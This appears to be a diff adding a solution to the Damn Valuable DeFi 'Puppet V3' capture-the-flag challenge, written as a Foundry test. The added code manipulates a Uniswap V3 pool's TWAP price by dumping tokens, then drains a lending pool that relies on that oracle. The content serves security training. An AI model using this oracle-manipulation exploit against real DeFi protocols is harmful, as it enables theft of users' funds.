@@ -10,6 +10,8 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {UniswapV3Exploit} from "./Puppet-v3_exploiter.sol";
+
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -118,9 +120,39 @@ contract PuppetV3Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV3() public checkSolvedByPlayer {
-        
-    }
+  function test_puppetV3() public checkSolvedByPlayer {
+    DamnValuableToken dvt = DamnValuableToken(token);
+
+    weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+    IUniswapV3Pool pool =
+        IUniswapV3Pool(
+            uniswapFactory.getPool(address(weth), address(token), FEE)
+        );
+
+    UniswapV3Exploit exploit = new UniswapV3Exploit(pool, dvt);
+
+    uint256 playerTokenBalance = dvt.balanceOf(player);
+
+    dvt.transfer(address(exploit), playerTokenBalance);
+
+    exploit.getTwapTick();
+    exploit.executeSwap();
+
+    vm.warp(block.timestamp + 110);
+
+    exploit.getTwapTick();
+
+    uint256 wethBalance = weth.balanceOf(player);
+
+    weth.approve(address(lendingPool), wethBalance);
+
+    uint256 borrowAmount = dvt.balanceOf(address(lendingPool));
+
+    lendingPool.borrow(borrowAmount);
+
+    dvt.transfer(recovery, borrowAmount);
+}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
